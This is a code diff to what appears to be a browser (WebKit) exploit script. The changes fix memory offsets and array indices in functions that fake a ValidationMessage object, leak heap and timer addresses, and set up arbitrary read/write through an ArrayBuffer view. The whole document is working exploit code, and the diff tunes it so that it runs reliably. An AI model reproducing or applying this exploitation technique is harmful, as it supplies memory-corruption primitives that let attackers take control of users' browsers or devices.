@@ -61,7 +61,7 @@ function setupRW() {
 	debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
-	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 2;
+	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 0;
 	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
@@ -333,7 +333,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[0] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -363,13 +363,13 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][0]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
 
